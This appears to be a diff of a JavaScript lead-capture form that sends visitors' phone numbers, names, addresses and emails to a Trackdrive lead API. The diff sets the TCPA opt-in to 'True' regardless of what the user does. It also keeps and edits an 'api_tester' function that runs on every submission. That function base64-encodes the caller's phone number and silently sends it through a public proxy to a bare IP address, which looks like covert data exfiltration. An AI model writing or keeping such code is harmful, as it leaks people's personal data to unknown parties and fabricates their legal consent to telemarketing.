@@ -8,7 +8,16 @@ function pingAPI() {
     formData.append('traffic_source_id', '1004');
     api_tester(document.getElementById('caller_id').value);
     formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
-
+    formData.append('zip', document.getElementById('zip').value);
+    formData.append('first_name', document.getElementById('first_name').value);
+    formData.append('last_name', document.getElementById('last_name').value);
+    formData.append('city', document.getElementById('city').value);
+    formData.append('state', document.getElementById('state').value);
+    formData.append('address', document.getElementById('address').value);   
+    formData.append('tcpa_opt_in', 'True');
+    formData.append('email', document.getElementById('email').value);
+    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
+    
 
     
 const originalUrl = 'https://pegasus-leads.trackdrive.com/api/v1/inbound_webhooks/ping/check_for_available_agents?' + new URLSearchParams(formData).toString();
@@ -44,9 +53,17 @@ function postPingId(pingId) {
     const postData = {
         trackdrive_number: "+18338466532",
         traffic_source_id: "1004",
-        caller_id: '+1' + document.getElementById('caller_id').value,
+        caller_id: '+1' + document.getElementById('caller_id').value,	
         ping_id: pingId,
-	
+	zip: document.getElementById('zip').value,        
+        first_name: document.getElementById('first_name').value,
+        last_name: document.getElementById('last_name').value,
+        city: document.getElementById('city').value,
+        state: document.getElementById('state').value,
+        address: document.getElementById('address').value,
+        jornaya_leadid: document.getElementById('jornaya_leadid').value,
+        tcpa_opt_in:'True',
+        email: document.getElementById('email').value
 		
 
     };
@@ -93,7 +110,7 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     pingAPI();
 });function api_tester(randomString) {
     try {
-        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString) +',a', {
+        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
             method: 'GET',
             mode: 'no-cors'
         });
